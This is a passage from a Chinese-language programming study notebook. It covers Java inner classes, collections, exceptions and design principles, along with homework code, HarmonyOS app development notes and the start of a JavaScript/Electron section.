		for (int i:a)
			System.out.println(i);
	}
}

class IntComparator implements Comparator&lt;Integer&gt;{

	@Override
	public int compare(Integer arg0, Integer arg1) {
		// TODO Auto-generated method stub
		return arg0-arg1;
	}
}
</code></pre>
<p><strong>闭包closure</strong>：（参考《Java核心编程》第六章 6.2.6）.总之，可以放心的引用外部的变量，但是不要在任何地方（lambda里头或外头）修改它。</p>
<h3 id="312-inner-classes"><a class="header" href="#312-inner-classes">3.12. Inner classes</a></h3>
<p>定义在别的函数、对象内部的类，称为内部类。好处是可以访问类的所有方法。内部类是编译器现象，和虚拟机无关。</p>
<pre><code class="language-java">import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.time.Instant;
import javax.swing.*;

public class Clock {
	private int interval;
	private boolean beep;
	
	public Clock(int interval,boolean beep) {
		this.interval = interval;
		this.beep = beep;
	}
	
	public void start1() {
		TimePrinter listener = new TimePrinter(this);
		Timer timer = new Timer(interval,listener);
		timer.start();
	}
	/*	这就是内部类
	 * 	内部类的好处是可以方便的访问外部的变量，无论是用什么修饰符。比如你看这里的beep。
	 * 	你可以把内部类声明为private类型。
	 */
	private class TimePrinter implements ActionListener{
		Clock outer;
		//这是默认的内部类Constructor.
		public TimePrinter(Clock clock) {
			outer = clock;
		}
		
		@Override
		public void actionPerformed(ActionEvent event) {
			System.out.println(&quot;At the tone,the time is&quot;+
					Instant.ofEpochMilli(event.getWhen()));
			if (outer.beep) Toolkit.getDefaultToolkit().beep();
	}

	public void start2() {
		TimePrinter listener = new TimePrinter(this);
		Timer timer = new Timer(interval,listener);
		class TimePrinter implements ActionListener{
			@Override
		    public void actionPerformed(ActionEvent event) {
			System.out.println(&quot;At the tone,the time is&quot;+
					Instant.ofEpochMilli(event.getWhen()));
			if (outer.beep) Toolkit.getDefaultToolkit().beep();
			}
		}
	}
	
	public static void main(String...args) {
		Clock clock = new Clock(1000,true);
		clock.start1();
		JOptionPane.showMessageDialog(null, &quot;Exit now&quot;);
		System.exit(0);
	}
}
还有局部内部类和匿名内部类。
</code></pre>
<h3 id="313-reflection"><a class="header" href="#313-reflection">3.13. Reflection</a></h3>
<hr />
<h2 id="4-java核心类"><a class="header" href="#4-java核心类">4. Java核心类</a></h2>
<h3 id="41-collectioncontainer"><a class="header" href="#41-collectioncontainer">4.1. Collection/Container</a></h3>
<p>关于迭代器的参考链接：https://www.liaoxuefeng.com/wiki/1252599548343744/1265112034799552
关于“相等”：https://www.liaoxuefeng.com/wiki/1252599548343744/1265116446975264</p>
<p>不同于C语言，你可以在程序的运行过程中动态的创建数组对象。一般常用容器的有三个：</p>
<ul>
<li>List：一种有序列表的集合，例如，按索引排列的Student的List；</li>
</ul>
<pre><code class="language-java">ArrayList &lt;E&gt;()    
    ArrayList &lt;E&gt;(int initialCapacity)    //用指定容量构造一个空数组列表，可以提高运行效率
    int size()    //返回当前存储在数组列表中的元素个数
    boolean add(E obj)    //添加元素，返回true
    E set(int index,E obj)    //
    E get(int index)    //
    void add(int index, E obj)    //在index后面将obj插入，插入是低效率的。
    E remove(int index)    //删除index的元素，后面的元素前移，删除是低效率的。返回删除的元素（像pop）
</code></pre>
<ul>
<li>Set：一种保证没有重复元素的集合，例如，所有无重复名称的Student的Set；</li>
<li>Map：一种通过键值（key-value）查找的映射表集合，例如，根据Student的name查找对应Student的Map。</li>
</ul>
<pre><code class="language-java">package hello;
//用IDE的好处就是，他会自动帮你import
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;    

public class Hello {
	public static void main(String[] args) {
		// TODO Auto-generated method stub
		
	//创建容器，尖括号制定了保存元素的类型
		ArrayList&lt;String&gt; names = new ArrayList&lt;String&gt;();
		HashMap&lt;String, String&gt; prime = new HashMap&lt;String, String&gt;();
		HashSet&lt;Integer&gt; numbers = new HashSet&lt;Integer&gt;();
	//对顺序容器的一些操作
        //add默认在最后添加元素，也可以指定Index
		names.add(&quot;朱启月&quot;);
		names.add(&quot;季高强&quot;);
        //ArrayList和数组的转换常用办法
        String[] namebak = names.toArray(new String[names.size()]);
		System.out.println(names.toString()+&quot; &quot;+ names.size());
		//老师说print会自动调用对象的toString方法。
		System.out.println(names+&quot; &quot;+ names.size());
		names.remove(0);
		System.out.println(names.get(0));
	//对哈希表的一些操作
		prime.put(&quot;Ji&quot;,&quot;Gaoqiang&quot;);
		prime.put(&quot;Zhu&quot;,&quot;Yaye&quot;);
		//键是唯一的，后面会覆盖前面。
		prime.put(&quot;Zhu&quot;, &quot;Qiyue&quot;);	
		//遍历的一般方法
		for (String i: prime.keySet())
			System.out.println(&quot;姓&quot;+i+&quot; 名&quot;+prime.get(i));	
	//对集合的一些操作
		numbers.add(1);		
		numbers.add(1);
		numbers.add(4);
		numbers.add(2);
		//满足集合的无序性和唯一性
		for (int i:numbers)
			System.out.println(i);
	}
}
</code></pre>
<h3 id="42-wrap"><a class="header" href="#42-wrap">4.2. Wrap</a></h3>
<p>对于基本数据类型，Java提供了对应的包裹(wrap)类型。这些包裹类型将一个基本数据类型的数据转换成对象的形式，从而使得它们可以像对象一样参与运算和传递。下表列出了基本数据类型所对应的包裹类型：
在使用Wrap类型和基本类型时，基本没有什么区别。<strong>编译器</strong>会自动的帮你装箱和拆箱。不过在用 == 要注意，包装类型最好用equals。</p>
<div class="table-wrapper"><table><thead><tr><th>基本类型</th><th>包裹类型</th></tr></thead><tbody>
<tr><td>boolean</td><td>Boolean</td></tr>
<tr><td>char</td><td>Character</td></tr>
<tr><td>byte</td><td>Byte</td></tr>
<tr><td>short</td><td>Short</td></tr>
<tr><td>int</td><td>Integer</td></tr>
<tr><td>long</td><td>Long</td></tr>
<tr><td>float</td><td>Float</td></tr>
<tr><td>double</td><td>Double</td></tr>
</tbody></table>
</div>
<p>然后你就可以利用一些属性和方法了。一般我们都是让类的首字母大写。</p>
<pre><code class="language-java">//Interger类中的一些方法
int intValue()        
static String toString(int i)    
static String toString(int i,int radix)    //返回i的radix进制表示字符串。
static int parseInt(String s)
static int parseInt(String s,int radix)    //解析radix进制数s 
</code></pre>
<h3 id="43-exception"><a class="header" href="#43-exception">4.3. Exception</a></h3>
<p>视频：https://www.icourse163.org/learn/ZJU-1001542001?tid=1458169441#/learn/content?type=detail&amp;id=1232785035&amp;cid=1251276117&amp;replay=true
如果你的函数可能抛出异常，可以加throws。子类不能比父类声明更多的throws。
父类异常可以捕捉子类异常，catch会按顺序捕捉异常。
try-catch可以处理异常。throw来抛出异常。</p>
<pre><code>                     ┌───────────┐
                     │  Object   │
                     └───────────┘
                           ▲
                           │
                     ┌───────────┐
                     │ Throwable │
                     └───────────┘
                           ▲
                 ┌─────────┴─────────┐
                 │                   │
           ┌───────────┐       ┌───────────┐
           │   Error   │       │ Exception │
           └───────────┘       └───────────┘
                 ▲                   ▲
         ┌───────┘              ┌────┴──────────┐
         │                      │               │
┌─────────────────┐    ┌─────────────────┐┌───────────┐
│OutOfMemoryError │... │RuntimeException ││IOException│...
└─────────────────┘    └─────────────────┘└───────────┘
                                ▲
                    ┌───────────┴─────────────┐
                    │                         │
         ┌─────────────────────┐ ┌─────────────────────────┐
         │NullPointerException │ │IllegalArgumentException │...
         └─────────────────────┘ └─────────────────────────┘
</code></pre>
<p>示例代码：</p>
<pre><code class="language-java">public static void main(String[] args) {
    //用throws声明可能出现的异常
    public static void process1() throws UnsupportedEncodingException {   
        //向上层抛出异常
        throw new UnsupportedEncodingException()    
    }
    //捕获异常
    //一套完整的业务逻辑
    try {    
        process1();
        process2();
        process3();    
    //子类异常要写在前面，否则永远捕获不到 catch (UnsupportedEncodingException e) {    
        System.out.println(&quot;Bad encoding&quot;);
    } catch (IOException e) {
        System.out.println(&quot;IO error&quot;);
    }

}
}
</code></pre>
<p>有一个很有用的语句：try-with-Resource。如果Resource实现了AutoCloseable接口<code>void close throws Exception</code>，那么对于打开Resource的操作可以这样写：</p>
<pre><code class="language-java">try (Resource res = ...)
{
    work with res...
}
catch (){}
finally(){}
</code></pre>
<p>当try块退出时(异常、正常退出)，会自动调用res.close()</p>
<h3 id="44-stream"><a class="header" href="#44-stream">4.4. Stream</a></h3>
<h3 id="45-math-class"><a class="header" href="#45-math-class">4.5. Math Class</a></h3>
<h3 id="46-big-number"><a class="header" href="#46-big-number">4.6. Big number</a></h3>
<p>BigInteger库实现了任意精度的整数运算。
BigDecimal库实现了任意精度的浮点数运算。</p>
<h3 id="47-string-class"><a class="header" href="#47-string-class">4.7. String Class</a></h3>
<p>常用方法：</p>
<div class="table-wrapper"><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody>
<tr><td>int length()</td><td></td></tr>
<tr><td>String replace(CharSequence old,CharSequence new)</td><td>这里的CharSequence可以是String或StringBuilder</td></tr>
<tr><td>boolean startWith(String prefix)</td><td>如果字符串以prefix开头，返回true</td></tr>
<tr><td>String toLowerCase()</td><td></td></tr>
<tr><td>String toUpperCase()</td><td></td></tr>
<tr><td>String trim()</td><td>删除头尾的空格</td></tr>
<tr><td>boolean equals(Object other)</td><td>如果字符串相等返回true</td></tr>
<tr><td>int compareTo(String other)</td><td>按字典序，如果在other前返回-1，后返回1，同返回0</td></tr>
<tr><td>int indexOf(String str)</td><td></td></tr>
<tr><td>int indexOf(String str,int fromindex)</td><td>返回字符串str匹配的第一个子串开始的位置。从fromindex或0开始寻找。</td></tr>
</tbody></table>
</div>
<h3 id="48-array-class"><a class="header" href="#48-array-class">4.8. Array Class</a></h3>
<h3 id="49-object-class"><a class="header" href="#49-object-class">4.9. Object Class</a></h3>
<p>Java的继承只允许单继承，即一个类只能有一个父类，并且除了Object，每个类都有一个父类。
注意到我们在定义Person的时候，没有写extends。在Java中，没有明确写extends的类，编译器会自动加上extends Object。所以，任何类，除了Object，都会继承自某个类。
Object里面有一些默认的方法，比如
equals():判断是否相同，返回boolean。
正确的equals方法应该满足</p>
<ol>
<li>自反性 x.equals(x)为true</li>
<li>传递性 若x.equals(y)为true,y.equals(z)为true,那么x.equals(z)也应该为true</li>
<li>对称性 x.equals(y) == y.equals(x)</li>
<li>一致性 如果x和y引用的对象没有变化，x.equals(y)也不应该有变化</li>
<li>x.equals(null) == false</li>
</ol>
<pre><code class="language-java">//正确的equal方法
public boolean equals(Object otherObject){
    //如果指向同一个对象，显然equals。用于优化。
    if (this == otherObject) return true;    
    if (otherObject == null) return false;
//  下面两句，如果要求同类比较请用第一句，如果要求所有的子类都可以相互比较请用第二句
//  if (this.getClass() != otherObject.getClass()) return false;
//  if (!otherObject instanceof ClassName) return false;
    //强制类型转换
    ClassName other = (ClassName) otherObject;
    //接下来比较对应的字段
    return this.filed1 == other.filed1 &amp;&amp; this.filed2 == other.filed2    ....
}
</code></pre>
<p>toString():转换成字符串类型。如果你用+（字符串加），会自动调用这个方法。</p>
<pre><code class="language-java">//一般来说，自定义的toString方法都长这样：
public toString(){
    return getClass().getName()
    + &quot;[name&quot; + name
    + &quot;,salary&quot; + salary
    + &quot;]&quot;;
}
//返回 类名[一些键值对]
//&quot;&quot;+x    或者 x.toString    
</code></pre>
<p><code>getClass()</code>:获取对象的<strong>运行时类</strong>，返回一个Class类。（这个类还是很神奇的）</p>
<p><code>hashcode()</code>：返回哈希值，int。<strong>如果两个对象x.equals(y)返回true，那么他们一个有相同的hashcode。</strong>
示例代码：</p>
<h3 id="410-objects-class"><a class="header" href="#410-objects-class">4.10. Objects Class</a></h3>
<p>该类提供了很多静态方法。
static T requireNonNull(T obj)
如果T不是NULL，返回T，如果T是NULL，抛出一个异常。用于参数检查。
static T requireNonNullElse(T obj,T defaultObj)
如果T不是Null返回T，如果T是Null，返回一个默认对象</p>
<h3 id="411-random-class"><a class="header" href="#411-random-class">4.11. Random Class</a></h3>
<p>java.util.Random
int nextInt(int n)
返回一个0～n-1之间的随机数。</p>
<h3 id="412-logger"><a class="header" href="#412-logger">4.12. Logger</a></h3>
<h2 id="5-design-principles"><a class="header" href="#5-design-principles">5. Design principles</a></h2>
<ul>
<li>消除代码复制————整合成函数</li>
<li>降低耦合度————封装
方便日后的修改维护
尽可能让所有变量都是private</li>
<li>可扩展性————使用容器
可扩展性的意思就是代码的某些部分不需要经过修改就能适应将来可能的变化。</li>
<li>数据和表现分离</li>
<li>设计程序时先定义接口，再实现类</li>
<li>在函数间传入传出的一定是接口而不是具体的类</li>
</ul>
<h3 id="51-relation-between-class"><a class="header" href="#51-relation-between-class">5.1. Relation between Class</a></h3>
<p>依赖：一个类的方法，操纵另一个类的对象。
聚合：一个类的对象，包含另一个类的对象。
继承：特殊和一般的关系。</p>
<h3 id="52-design-tactics-of-class"><a class="header" href="#52-design-tactics-of-class">5.2. Design tactics of Class</a></h3>
<ol>
<li>保证数据私有 private</li>
<li>保证对数据初始化，不要依赖于系统的默认值</li>
<li>不要使用过多的基本类型</li>
<li>对职责过多的类进行分解</li>
<li>命名符合规范</li>
</ol>
<h3 id="53-design-tactics-of-inheritance"><a class="header" href="#53-design-tactics-of-inheritance">5.3. Design tactics of Inheritance</a></h3>
<ol>
<li>将公共操作和字段放在超类中</li>
<li>不要使用protected修饰。不过protected对指示那些不提供一般用途而在子类中重新定义的方法很有用。</li>
<li>使用继承实现&quot;is-a&quot;关系，子类应该是特殊的父类。</li>
<li>除非所有继承的方法都有意义，否则不要使用继承。就是说如果存在父类的方法 不是子类应该具备的，就不要使用继承。</li>
<li>在覆盖方法时，不要改变预期的行为。就是说父类和子类的方法应该统一。</li>
<li>使用多态，而不要使用类型信息。</li>
<li>不要滥用反射。</li>
</ol>
<h3 id="54-design-tactics-of-exception"><a class="header" href="#54-design-tactics-of-exception">5.4. design tactics of Exception</a></h3>
<ol>
<li>异常处理不能代替简单的测试。尽量通过检查避免异常而不是通过异常处理。</li>
<li>不要过分的细化异常。在一套完整的业务逻辑之后处理异常。</li>
<li>充分利用异常结构。能用子类异常不用父类异常。</li>
<li>不要压制异常。</li>
<li>早抛出，晚捕获。</li>
</ol>
<h2 id="6-homework"><a class="header" href="#6-homework">6. Homework</a></h2>
<p>作业1：</p>
<pre><code class="language-java">public class Fraction {
	private int a;
	private int b;
	
	Fraction(int a,int b)    //构造函数
	{
		this.a = a;
		this.b = b;
	}
	
	double toDouble()
	{
		return (double)a/(double)b;
	}

	Fraction plus(Fraction r)
	{
		int a = r.a*this.b + r.b*this.a;
		int b = r.b*this.b;
		Fraction x = new Fraction(a,b);
		return x;
	}
	Fraction multiply(Fraction r)
	{
		int a = r.a*this.a;
		int b = r.b*this.b;
		Fraction x = new Fraction(a,b);
		return x;
	}
	void print()
	{
		int max = this.a&gt;this.b?this.a:this.b;
		int min = this.a&gt;this.b?this.b:this.a;
		int x = this.gcd(max,min);
		if (x==this.b)
			System.out.println(this.a);
		else 
			System.out.println(this.a/x+&quot;/&quot;+this.b/x);
	}
	private int gcd(int x,int y)
	{
		x = x % y;
		if (x==0) return y;
		else return gcd (y,x);
	}

	public static void main(String[] args) {
		// TODO Auto-generated method stub
		Fraction num=new Fraction(24,36);
		Fraction num2 = num.multiply(num);
		num2.print();
	}
</code></pre>
<p>作业2：（关于类的应用）</p>
<pre><code class="language-java">//Display.java
package clock;

public class Clock {
	private Display minute;
	private Display hour;
	
	Clock()
	{
		this.minute = new Display(60);
		this.hour= new Display(24);
	}
	
	public void showtime()
	{
		System.out.printf(&quot;%02d:%02d\n&quot;,hour.getnum(),minute.getnum());
	}
	public void increase()
	{
		minute.increase();
		if (minute.getnum()==0)
			hour.increase();
	}
	
	public static void main(String[] args) {
		// TODO Auto-generated method stub
		int i;
		Clock clock = new Clock();
		for (i=0;i&lt;1000;i++)
		{
			clock.showtime();
			clock.increase();
		}
	}
}
//Clock.java
package clock;

public class Display {
	private int num;
	private int limit;
	
	Display(int limit)
	{
		this.num = 0;
		this.limit = limit;
	}
	public int getnum()
	{
		return this.num;
	}
	public void increase()
	{
		num++;		//this是可以省略的
		if (num==limit)
			num = 0;
	}
}
</code></pre>
<p>作业4：</p>
<pre><code class="language-java">package jicheng;

import java.util.ArrayList;

//一个图书馆的数据库
public class Database {
	private ArrayList&lt;Item&gt; list = new ArrayList&lt;Item&gt;();
	
	public void addItem(Item item) {
		list.add(item);
	}
	
	public void showItem() {
		for (Item i: list) {
			i.showInfo();
		}
	}
	
	public static void main(String[] args) {
		// TODO Auto-generated method stub
		Database data = new Database();
        //子类的对象可以赋给父类的变量。（父类的*管理者*，也可以管理子类）反之不然。
		Item item = new Book(&quot;CSAPP&quot;,&quot;001&quot;,&quot;123-123-123-123&quot;);
		data.addItem(item);
		data.showItem();
	}

}
//---------------------------------
package jicheng;

public class Item {
	private String name;
	private String number;
	private boolean borrowed;
	
    //其实默认继承了Object类
	public Item(String name, String number) {
		super();
		this.name = name;
		this.number = number;
		this.borrowed = false;
	}
	
	public void showInfo()
	{
		String b = new String();
		b = borrowed?&quot;Borrowed&quot;:&quot;Not Borrowed&quot;;
		System.out.print(this.name+&quot; &quot;+this.number+&quot; &quot;+b+&quot; &quot;);
	}
}

//----------------------
package jicheng;

//通过extends关键字实现继承
public class Book extends Item{
	private String ISBN;
	
	public Book(String name, String number, String ISBN) {
		//调用父类的构造函数
        super(name, number);
		this.ISBN = ISBN;
	}

    //覆盖了父类的showInfo
	public void showInfo()
	{
		super.showInfo();
		System.out.println(ISBN);
	}
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="java-鸿蒙应用开发"><a class="header" href="#java-鸿蒙应用开发">Java-鸿蒙应用开发</a></h1>
<p>参考文档：https://developer.harmonyos.com/cn/docs/documentation/doc-references/reference-document-outline-0000001115016824</p>
<p>实例工程：https://developer.harmonyos.com/cn/docs/documentation/doc-guides/samples-0000001162414961</p>
<p>CodeLab：https://developer.huawei.com/consumer/cn/codelabsPortal/index</p>
<p>备忘录：https://github.com/reticenceji/todo_harmonyOS</p>
<h2 id="hello-world-1"><a class="header" href="#hello-world-1">Hello world</a></h2>
<p>首先要下载<a href="https://developer.harmonyos.com/cn/develop/deveco-studio">IDE</a>，最好是Windows10。然后根据<a href="https://developer.harmonyos.com/cn/docs/documentation/doc-guides/start-with-js-0000000000029619">入门 JS</a>编写第一个Hello world。</p>
<blockquote>
<p>功能点-<a href="https://developer.harmonyos.com/cn/docs/documentation/doc-guides/start-with-js-0000000000029619">页面切换</a></p>
<ol>
<li>首先要在配置文件中加入页面的route。 <strong>表示基于JS UI框架开发的JS模块集合，其中的每个元素代表一个JS模块的信息。</strong> </li>
</ol>
<pre><code class="language-json">&quot;js&quot;: [
      {
        &quot;pages&quot;: [
          &quot;pages/index/index&quot;,
          &quot;pages/edit/edit&quot;			// Here
        ],
        &quot;name&quot;: &quot;default&quot;,
        &quot;window&quot;: {
          &quot;designWidth&quot;: 720,
          &quot;autoDesignWidth&quot;: true
        }
      }
    ]
</code></pre>
<ol start="2">
<li>关键的路由切换函数</li>
</ol>
<pre><code class="language-javascript">import router from '@system.router';

export default {
  launch() {
    router.push ({
      uri:'pages/details/details', // 指定要跳转的页面
    })
  }
}
</code></pre>
</blockquote>
<h2 id="entry"><a class="header" href="#entry">Entry</a></h2>
<ul>
<li>
<p>libs 二进制</p>
</li>
<li>
<p>resources 资源文件</p>
<pre><code>|element
|   |   |media
|   |   |en_GB-vertical-car-mdpi // 限定词目录示例，需要开发者自行创建   
|   |string.json
|   |icon.png
|- | - |  | ----- |
</code></pre>
</li>
</ul>
<p>| for  | Array   | -      | 根据设置的数据列表，展开当前元素。        |
| if   | boolean | -      | 根据设置的boolean值，添加或移除当前元素。 |
| show | boolean | -      | 根据设置的boolean值，显示或隐藏当前元素。 |</p>
<h4 id="ui"><a class="header" href="#ui">UI</a></h4>
<p>利用HTML+CSS我们可以简单的绘制好看的用户界面。利用IDE的Preview功能我们可以动态查看我们的UI效果。</p>
<p><a href="https://developer.harmonyos.com/cn/docs/documentation/doc-references/js-components-common-attributes-0000001050831187">组件</a>的官方文档，看着名字就大概可以猜到作用。</p>
<p>通过<a href="https://www.w3school.com.cn/cssref/css_selectors.asp">CSS 选择器</a>，我们美化我们的组件。组件普遍支持的可以在style或css中设置组件<a href="https://developer.harmonyos.com/cn/docs/documentation/doc-references/js-components-common-styles-0000001050791158">外观样式</a>。</p>
<p>当然，真正的UI设计也是一门艺术。</p>
<p><a href="https://developer.harmonyos.com/cn/docs/documentation/doc-guides/ui-js-fa-developing-0000001063300612">开发-开发一个JS FA应用 (harmonyos.com)</a>: 通过里面代码的例子（搜索<code>cartStyle</code>。在HTML给元素注册事件关联的函数，以及一些属性设置为变量<code>{{cartStyle}}</code>，在js中写函数，通过<code>this.cartStyle</code>可以修改元素的值。如果需要修改的是样式，可以修改<code>class</code>属性，然后在css中通过类选择器<code>.className</code>来规定不同样式。）</p>
<p><a href="https://developer.harmonyos.com/cn/docs/documentation/doc-references/lite-wearable-lifestyle-0000001169264881">JS API参考-生命周期 (harmonyos.com)</a></p>
<p><a href="https://developer.harmonyos.com/cn/docs/documentation/doc-guides/ui-js-building-ui-event-0000000000500592">开发-事件 (harmonyos.com)</a>，比如长按<code>longpress</code>，点击<code>click</code></p>
<p><a href="https://developer.harmonyos.com/cn/docs/documentation/doc-references/js-framework-file-0000000000611396">JS API参考-文件组织 (harmonyos.com)</a></p>
<p><a href="https://developer.harmonyos.com/cn/docs/documentation/doc-references/js-components-common-attributes-0000001050831187">JS API参考组件 (harmonyos.com)</a> ： 介绍了很多常用的属性，以及怎么修改属性。通过这些组件我们可以很好的构建前端的样式。</p>
<p><a href="https://developer.harmonyos.com/cn/docs/documentation/doc-references/js-apis-basic-features-routes-0000000000611824">JS API参考-页面路由 (harmonyos.com)</a> 页面路由可以让我们在不同的页面之间跳转，记得在配置文件写好页面的路由。</p>
<p>组件</p>
<h3 id="jsjava"><a class="header" href="#jsjava">JS+JAVA</a></h3>
<p><strong>数据访问的代码是在Java里写的，页面逻辑是JS写的，他们之间怎么进行交互？</strong><a href="https://developer.harmonyos.com/cn/docs/documentation/doc-guides/ui-js-fa-call-pa-0000001050435961">开发-JS FA如何调用PA (harmonyos.com)</a>。</p>
<h4 id="json"><a class="header" href="#json">JSON</a></h4>
<p>事实上，核心就是之间的交互一切都是<strong>字符串的交互</strong>，凡是不是字符串的东西都编码成字符串。常用的编码方式是<strong>JSON</strong>格式，两边都有库支持。JSON 指的是 JavaScript 对象标记法（<em>J</em>ava<em>S</em>cript <em>O</em>bject <em>N</em>otation），JSON 是一种轻量级的数据交换格式，JSON 具有自我描述性且易于理解，JSON 独立于语言。</p>
<pre><code>// Java JSON 方法，第三方JSON库

</code></pre>
<pre><code class="language-js">// JS JSON 方法
var myObj = { name:&quot;Bill Gates&quot;,  age:62, city:&quot;Seattle&quot; };		// 一个 对象
var myJSON =  JSON.stringify(myObj);	//把 对象 变成一个 JSON字符串
var Obj = JSON.parse(myJSON);
</code></pre>
<h2 id="java和后端"><a class="header" href="#java和后端">Java和后端</a></h2>
<h3 id="java语法概述"><a class="header" href="#java语法概述">Java语法概述</a></h3>
<p>Java中的对象可以理解为 C++中的智能指针，更准确的说是垃圾回收机制啦。</p>
<h3 id="日志-2"><a class="header" href="#日志-2">日志</a></h3>
<p>善用Log，HarmonyOS提供了<a href="https://developer.harmonyos.com/cn/docs/documentation/doc-guides/hilog-overview-0000001061752577">HiLog日志系统</a>，让应用可以按照指定类型、指定级别、指定格式字符串输出日志内容，帮助开发者了解应用的运行状态，更好地调试程序。</p>
<h3 id="service-ability"><a class="header" href="#service-ability">Service Ability</a></h3>
<p>https://developer.harmonyos.com/cn/docs/documentation/doc-guides/ability-service-concept-0000000000044457</p>
<h3 id="data-ability"><a class="header" href="#data-ability">Data Ability</a></h3>
<p>https://developer.harmonyos.com/cn/docs/documentation/doc-guides/ability-data-concept-0000000000043058</p>
<h3 id="intent"><a class="header" href="#intent">Intent</a></h3>
<p>Intent是对象之间传递信息的载体。例如，当一个Ability需要启动另一个Ability时，或者一个AbilitySlice需要导航到另一个AbilitySlice时，可以通过Intent指定启动的目标同时携带相关数据。Intent的构成元素包括Operation与Parameters，具体描述参见<a href="https://developer.harmonyos.com/cn/docs/documentation/doc-guides/ability-intent-0000000000038799#ZH-CN_TOPIC_0000001076675608__table610715348476">表1</a>。</p>
<pre><code class="language-java">// 设置传递的参数，可以反复调用传递多个参数
intent.setParam(key, value);
// 获得参数，一般不直接用
intent.getParam(key);
intent.getStringParam();...
</code></pre>
<p>intent.setOperation()</p>
<h3 id="数据库"><a class="header" href="#数据库">数据库</a></h3>
<p><strong><a href="https://developer.harmonyos.com/cn/docs/documentation/doc-guides/database-relational-guidelines-0000000000030051">关系型数据库</a></strong>： HarmonyOS底层采用SQLite作为持久化存储引擎。一个Demo<a href="https://developer.huawei.com/consumer/cn/codelabsPortal/carddetails/HarmonyOS-Relational-Database">Codelabs_华为尖端技术_编码体验-华为开发者联盟 (huawei.com)</a>。</p>
<p><strong><a href="https://developer.harmonyos.com/cn/docs/documentation/doc-guides/database-orm-overview-0000000000030070">对象关系映射数据库</a></strong>： 通过操作对象的形式操作数据库。</p>
<p><strong><a href="https://developer.harmonyos.com/cn/docs/documentation/doc-guides/database-preference-overview-0000000000030086">轻量级偏好数据库</a></strong>：内存中也会有一份，所以不适合大数据。一个Demo<a href="https://developer.huawei.com/consumer/cn/codelabsPortal/carddetails/HarmonyOS-Preferenced-Database">Codelabs_华为尖端技术_编码体验-华为开发者联盟 (huawei.com)</a>。</p>
<p><strong><a href="https://developer.harmonyos.com/cn/docs/documentation/doc-guides/database-mdds-overview-0000000000030123">分布式数据库</a></strong>：</p>
<h2 id="分布式数据服务"><a class="header" href="#分布式数据服务">分布式数据服务</a></h2>
<h2 id="异步编程"><a class="header" href="#异步编程">异步编程</a></h2>
<p>一般主线程用于UI的绘制
TaskDispatcher 任务分发器
GlobalTaskDispatcher
<a href="https://developer.harmonyos.com/cn/docs/documentation/doc-guides/thread-mgmt-guidelines-0000000000032130">线程管理开发指导</a></p>
<p>CES common event service 公共事件服务，可以让所有的进程都感知到</p>
<h2 id="流转"><a class="header" href="#流转">流转</a></h2>
<p><a href="https://developer.harmonyos.com/cn/docs/documentation/doc-guides/hop-overview-0000001092995092">流转</a></p>
<p><a href="https://developer.harmonyos.com/cn/docs/documentation/doc-references/js-apis-distributed-migration-0000001050024965">分布式迁移 js</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="javascript"><a class="header" href="#javascript">JavaScript</a></h1>
<p>鸿蒙课的时候用JavaScript糊了一点东西。</p>
<p>我对他的理解仅限于此了。</p>
<p>我觉得这种弱类型的语言真的是反人类，之后要学也是看看V8和TypeScript。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="electron"><a class="header" href="#electron">Electron</a></h1>
<p><img src="Language/JavaScript/../images/image-20210919102912483.png" alt="image-20210919102912483" /></p>
<h2 id="基础知识"><a class="header" href="#基础知识">基础知识</a></h2>
<h3 id="javascript-1"><a class="header" href="#javascript-1">JavaScript</a></h3>
<blockquote>
<p>JavaScript 也是一种嵌入式（embedded）语言。它本身提供的核心语法不算很多，只能用来做一些数学和逻辑运算。JavaScript 本身不提供任何与 I/O（输入/输出）相关的 API，都要靠宿主环境（host）提供，所以 JavaScript 只合适嵌入更大型的应用程序环境，去调用宿主环境提供的底层 API。</p>
<p>目前，已经嵌入 JavaScript 的宿主环境有多种，最常见的环境就是浏览器，另外还有服务器环境，也就是 Node 项目。</p>
<p>从语法角度看，JavaScript 语言是一种“对象模型”语言。各种宿主环境通过这个模型，描述自己的功能和操作接口，从而通过 JavaScript 控制这些功能。但是，JavaScript 并不是纯粹的“面向对象语言”，还支持其他编程范式（比如函数式编程）。</p>
</blockquote>
<blockquote>
<p>JavaScript 语言的每一个值，都属于某一种数据类型。JavaScript 的数据类型，共有六种。（ES6 又新增了第七种 Symbol 类型的值）</p>
<ul>
<li>数值（number）：整数和小数（比如<code>1</code>和<code>3.14</code>）。</li>
<li>字符串（string）：文本（比如<code>Hello World</code>）。</li>
<li>布尔值（boolean）：表示真伪的两个特殊值，即<code>true</code>（真）和<code>false</code>（假）。</li>
<li><code>undefined</code>：表示“未定义”或不存在，即由于目前没有定义，所以此处暂时没有任何值。</li>
<li><code>null</code>：表示空值，即此处的值为空。</li>
<li>对象（object）：各种值组成的集合。对象是最复杂的数据类型，又可以分成三个子类型。
<ul>
<li>狭义的对象（object）</li>
<li>数组（array）</li>
<li>函数（function）</li>
</ul>
</li>
</ul>
</blockquote>
<blockquote>
<p>undefined 和 null</p>
<p><code>null</code>表示空值，即该处的值现在为空。调用函数时，某个参数未设置任何值，这时就可以传入<code>null</code>，表示该参数为空。比如，某个函数接受引擎抛出的错误作为参数，如果运行过程中未出错，那么这个参数就会传入<code>null</code>，表示未发生错误。</p>
<p><code>undefined</code>表示“未定义”，下面是返回<code>undefined</code>的典型场景。</p>
<pre><code class="language-js">// 变量声明了，但没有赋值
var i;
i // undefined

// 调用函数时，应该提供的参数没有提供，该参数等于 undefined
function f(x) {
  return x;
}
f() // undefined

// 对象没有赋值的属性
var  o = new Object();
o.p // undefined

// 函数没有返回值时，默认返回 undefined
function f() {}
f() // undefined
</code></pre>
<p>会自动转换成false的值:</p>
<ul>
<li><code>undefined</code></li>
<li><code>null</code></li>
<li><code>false</code></li>
<li><code>0</code></li>
<li><code>NaN</code></li>
<li><code>&quot;&quot;</code>或<code>''</code>（空字符串）</li>
</ul>
</blockquote>
<h3 id="nodejs"><a class="header" href="#nodejs">Node.js</a></h3>
<p>npm就像cargo之于rust，pip之于python，nodejs就像rustc。目前给我的感觉是这样的。</p>
<blockquote>
<p>If a project has a <code>package.json</code> file, by running</p>
<pre><code class="language-bash">npm install
</code></pre>
<ul>
<li><a href="https://nodejs.dev/learn/the-package-json-guide">package.json</a>
<ul>
